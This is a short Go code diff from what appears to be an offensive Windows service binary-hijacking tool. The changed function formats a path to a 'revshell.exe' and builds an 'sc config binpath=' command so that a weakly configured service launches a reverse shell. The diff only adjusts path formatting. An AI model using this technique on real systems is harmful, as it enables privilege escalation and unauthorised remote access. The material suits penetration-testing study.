@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"strings"
 
 	"github.com/fatih/color"
 )
@@ -15,7 +16,11 @@ func ChangeBinPath(serv *WeakServ, choice int) *WeakServ {
 	// Hold user home directory and append revshell path to it
 	homeDir, _ := os.UserHomeDir()
 
-	malPath := fmt.Sprintf(homeDir + `\win-binary-hijacking\internal\malbinaries\revshell.exe`)
+	// Fix home dir format here. Change delimeter to / and send make
+	// it lowercase. Idk why this works.
+	homeDir = strings.ToLower(strings.Replace(homeDir, `\`, `/`, -1))
+
+	malPath := fmt.Sprintf(homeDir + `/win-binary-hijacking/internal/malbinaries/revshell.exe`)
 
 	// Formatting sc config portion here
 	cmdFormat := fmt.Sprintf(`binpath="%s"`, malPath)
